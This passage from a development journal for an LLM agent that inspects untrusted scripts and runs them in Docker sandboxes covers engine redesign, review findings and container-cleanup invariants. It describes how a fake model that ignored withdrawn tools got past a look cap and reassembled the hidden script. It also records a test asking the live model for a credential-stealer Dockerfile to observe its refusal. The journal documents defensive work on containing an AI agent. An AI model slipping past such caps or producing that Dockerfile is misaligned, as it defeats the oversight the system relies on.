non-blocking findings to the deferred list. This was not a suggestion from a reviewer, it
was the acceptance run for the thing being built, and what it showed was the central
capability failing its primary use case while a string in the code claimed otherwise. The
deferred list is for ideas that are not this change; a defect in this change is this
change's problem.

The wider point: three review rounds found four real bugs and none of them found this one.
Reviewers read the code and attacked the bounds. Only running it against a real model on a
real file showed that the tool works and is nearly useless, which is a category a test
suite is not built to notice.

Confirmed on the next live run, which is the only way this kind of fix can be confirmed:
`search_script("import")`, then one `read_script` at 10800 to 11300, then the Dockerfile.
Two looks instead of four, three model calls instead of five, and 17,328 tokens against
32,882. The search now points and the read goes there, which is what the tool was for.

## The agent became a graph, 2026-09-02

`envforge/graph.py` is the engine. A LangGraph `StateGraph` over an extended
`MessagesState`, a chat model with `bind_tools`, `@tool` functions in a `ToolNode`, and
conditional edges. There is no second engine and no flag to choose one.

### The version before this one, and why it was thrown away
The first attempt kept the existing `while` loop and added a graph beside it, with a
contract test proving the two agreed. Every test passed. It was the wrong thing, and the
argument against it is short: two engines are upkeep, and the second can never be allowed
to behave differently from the first without failing the contract, so it can never become
the thing LangGraph is for. Checkpointing, resuming and inspecting a run between nodes all
require the graph to be the thing actually running.

The second attempt was worse in a way that is easier to miss. It carried one mutable
object through the graph and mutated it inside the nodes. That looks identical from
outside, passes the same tests, and is a loop wearing a graph costume: nothing is
checkpointable, nothing is resumable, and what a node did to a run cannot be read from
what it returned.

Both are kept unmerged on a branch as reference. What was taken from them is the security
reasoning and the test scenarios, not the structure.

### What the model may do, and what it may not
Its tools read the script: a region by offset, or a literal search that returns every
match offset. Submitting a Dockerfile is a tool the graph **routes on** rather than
executes, so `ToolNode` holds only read-only tools and the gate, the build and the run are
nodes no tool call can reach. The submission tool's body raises, and a test asserts it.

The look cap is enforced by binding a different tool list once the budget is spent, never
by a sentence in the prompt. A rule written in a prompt is a request made of the thing the
prompt is defending against.

### The message reset, which is a security property
`add_messages` accumulates. The conversation is cleared at the start of every attempt,
because the bound on how much of the sample can reach one prompt assumes each attempt
starts fresh: without the reset, three attempts of four looks would put twelve slices of
the script in one context. The reason the last attempt failed comes back as a new message,
because the reset takes it away, and a test caught that before it shipped: a model retrying
without being told what was wrong is a model guessing.

### Running the sample twice, and the window that made it possible
The replay question was asked by a reviewer and not by me, and the first answer was wrong.

A checkpoint commits after a node returns. `sandbox.run` removed its container in a
`finally`, so a crash between that removal and the checkpoint left a resumed run with no
state and no container, and it executed the untrusted sample again. Building twice wastes
time; running twice is the one side effect in this program that must happen at most once.

Fixed by not deleting the evidence. `run` now kills its container and leaves it, and
removal happens in the next node, by which time the result is durable. So a container
bearing an attempt's name proves the attempt already executed, and a resumed run that
finds one refuses and reports the attempt as interrupted rather than inventing a verdict.

A Docker test asserted the old property, that no container outlived a run. It was true and
it was the bug.

### What a run leaves on the machine, which nobody had asked
Asked as a list of questions about images, tags, layers and cache, and the honest headline
was not the policy. It was that the graph implementation had **no image cleanup at all**,
because that code lived in the command line and the command line had not been ported, so
every graph run so far had left its image on the machine.

Cleanup now belongs to the object that owns the run, in a `finally`. Objects carry a label
naming their run and a label saying when it started, so a sweep can say "this is ours"
without matching a container a user named `envforge-something` themselves. The start time
is a label rather than the object's own timestamp so the sweep never parses a date: docker
prints those in a human format that varies with locale and version.

Two guards on the sweep, both about other people's work. Ownership, so a run cannot delete
the image it is about to execute. Age, because a second envforge may be running right now
and labels its objects identically, and there is no way to ask whether that process is
alive.

The limitation is written into the invariants rather than left for someone to discover:
the BuildKit cache grows without bound and nothing here prunes it. That is deliberate,
since pruning is what would make every repair attempt pay full price, and it means a
finished run does not leave the machine as it found it.

### Two record habits that finally got mechanisms
A test now reads the ADR headings and fails on a duplicate number or one out of order,
written after ADR-018 was used twice a fortnight apart. And the test that checks the event
vocabulary against what the code emits now reads both engine modules, because it read
`agent` alone, which was the engine when it was written and is not any more.

### What the cold review found, and the worst of it

Blocked on two, and the first is the most embarrassing defect in this project so far.

**The engine produced no events at all.** `Agent.run` collected them into a list nothing
read, then streamed with `stream_mode="custom"`, which yields only what a node writes
through LangGraph's stream writer. No node did. So the only engine in the project ran a
whole script, built an image, ran a container and yielded nothing: no verdict, no
`finished`, no sign anything had happened.

It was invisible because all four tests of that object called `list(agent.run(...))` to
drive the generator and then asserted on the sandbox. Not one looked at what came out.
That is a new shape of the old mistake: not a test that cannot fail, but a test that
never asks the question the object exists to answer.

**Repair messages accumulated, one per attempt.** `new_attempt` kept "the leading run of
system and human messages", and the repair message it appends is itself a `HumanMessage`,
so on the next attempt it had joined that leading run and was never removed again. The
bound invariant 24 states became linear in `max_attempts` rather than constant: at twelve
attempts the review measured 24,876 characters of the sample in one prompt against a
ceiling of 22,528.

The test that should have caught it recycled the same slices every attempt, so the count
of distinct sample characters could not grow no matter how many messages piled up. It now
reads somewhere new each time.

**The look cap was enforced by what was offered, not by the graph.** `model_node`
withdraws the inspection tools once the budget is spent, but the routing sent any name in
`INSPECTION` to the `ToolNode` without checking. A fake that ignored the withdrawal took
3,332 looks past the cap and reassembled the whole script over 3,336 model calls. The
module comment claimed the opposite in the same file. Withdrawing a tool is a rule the
provider enforces; the graph does not take its word for it any more.

**Provider failures escaped the graph.** A dead key came out as a raw SDK exception with
no `finished` event. The old loop had distinguished a rejected request from an unreachable
provider since the command line was written, and the port simply dropped it.
`provider_unavailable` was the one kind in the vocabulary the graph never emitted.

**Four unit tests had quietly started requiring Docker,** because the startup sweep calls
the binary and was the only call in `sandbox.py` with no `OSError` guard. The suite the
README calls "needs no daemon" died with `FileNotFoundError`, and running it performed
real removals on the developer's machine. The three host lookups are injectable now, and
the whole unit suite runs with `docker` off `PATH`.

**Invariants 28 and 30 contradicted each other,** which no amount of reading either would
have shown. 28 says a sample runs at most once per attempt, and rests on the container
surviving as evidence. 30 has the sweep delete another run's containers after an hour. So
a run resumed later than that finds no evidence, runs the sample again and reports an
ordinary verdict. Demonstrated against real Docker. The horizon is now written into 28
rather than left for someone to find.

Two mutations had survived: putting the submission tool into the `ToolNode`, which is the
exact wiring invariant 23 rests on, and treating a malformed `started` label as age zero,
which is the guard whose own comment calls it "how a sweep deletes something it should
not". Both have tests now.

### The second pass, and a record bug worse than the code ones

All three blockers confirmed gone by measurement: the engine yields, the prompt ceiling is
flat out to fifty attempts (11,093 characters at the worst, against a sample where the
attacker had been shown 409,600 distinct characters across the run), and a model that
ignores the withdrawn tool now takes four looks instead of 3,332.

Then it blocked again, on the records alone, and the finding is the sharpest kind.

**`ARCHITECTURE.md` carried two copies of invariants 23 to 28.** The new block was
appended without retiring the old one, so there were two different invariant 24s and two
different invariant 28s, and six places in the code and tests cite an invariant by number.
Every one of those citations named two rules at once. Merged: the newer wording wins for
23 to 27, the older 28 keeps its number because it is about the gate and has no
counterpart in the new block, and the at-most-once rule moved to 32 so no number ever
means two things. A test now fails on a duplicate, a gap, or an out-of-order entry, which
is the sibling of the one that guards ADR numbers and would not have caught this.

**And the event-kind count went stale for the third time.** It said thirteen when the code
had twelve, still thirteen when the tool loop made it fourteen, and this change added
`swept` without touching it. It is fifteen, and it is now read out of the record by a test
and compared with `len(VOCABULARY)`.

**ADR-019 contradicted the README in the same repository.** It said "there is no second
engine, no plain loop beside it", which is the sentence this project has a rule against:
the loop is still in `agent.py` and still what `python -m envforge` drives. The ADR now
states the decision and says plainly that the tree does not match it yet, and why.

**One code change came out of the same pass.** The reviewer pointed out that invariants 28
and 30 do not merely trade, they can be reconciled: containers are the evidence and cost
kilobytes, images are what fill a disk and were never evidence. The sweep now collects
images only and never touches a container. That turns a documented one-hour hole into no
hole, at the price of exited containers accumulating on a machine that crashes often,
which `docker container prune` clears.

The lesson worth keeping from this pass is that the code review found three real defects
and the record review found four, and the record ones are the sort nobody notices until
somebody acts on a number. Both invariant-numbering and count claims now have tests, which
is the third and fourth number in this project to be given a mechanism instead of another
promise to be careful.

## One engine and one model interface, 2026-09-03

The `while` loop is deleted. So is the hand-written request building and response parsing.
`python -m envforge` builds the graph, `make_llm` returns a LangChain chat model, and
`grep` for `class Agent` finds one file.

### What the real run found that every fake had hidden
The first end-to-end run against the live model worked: it searched the script, read the
region the search pointed at, found `tabulate` in the part the prompt had truncated,
installed it, and the container exited 0.

And it printed `the model called None with None` on every look.

`counted_inspect` read `messages[-1]` to say which tool had been called, and by the time
it runs the last message is the `ToolMessage` the tool node appended, not the `AIMessage`
that asked for it. Every test counted `looked` events and not one read the text of a
single one, so this was invisible through months of green. It is the same failure as the
engine that yielded nothing: a test that never asks the question the code exists to
answer.

### The refusal shape, observed rather than assumed
`refusal_reason` was written from documentation. Asking the live model for a Dockerfile
that downloads and runs a credential stealer returned `stop_reason` "refusal" with a
`stop_details` carrying a category and an explanation, and prose in `content` rather than
an empty string. The implementation was right, and the test now holds a copy of the real
payload rather than one invented to match the code.

### What survived the reversal
ADR-006 refused LangChain's model classes on the grounds that a small project with one
call site could not justify a dependency it could not explain, and that Anthropic's
compatibility layer ignores `strict` so only the native API grammar-constrains Claude.

Both rejections survive. `bind_tools` takes `strict`, and it goes to the two providers
that promise a grammar; Groq is a forced call plus local validation and `supports_strict`
says so in code rather than in prose. `ChatAnthropic` is an Anthropic client. The
dependency is explicable now for a reason the ADR could not have had: it is not there for
the model layer, it is there because the agent is a graph.

What the framework does not do is still ours, in 200 lines rather than 460: the spec
parser, the per-provider key check, and the classification of which HTTP status means an
empty account, a dead key, a rate limit, or our own bad request.

### Stopping is not deleting
The replay guard used to refuse a second execution and then remove the container on the
way out, which threw away the evidence: the checkpoint for that refusal can itself be lost
in a crash, and the next resume would find nothing and run the sample. A test asserted the
old behaviour and has been inverted.

A container found on replay is now stopped if it is still executing, because a process
that died leaves it running and the daemon does not stop it, and then left exactly where
it is. The sweep may stop a stray container and may never delete one. Two Docker tests
prove a real running container is stopped but stays.

The limitation that remains, stated rather than implied: this needs a durable
checkpointer, and `docker container prune` between a crash and a resume removes the
evidence.
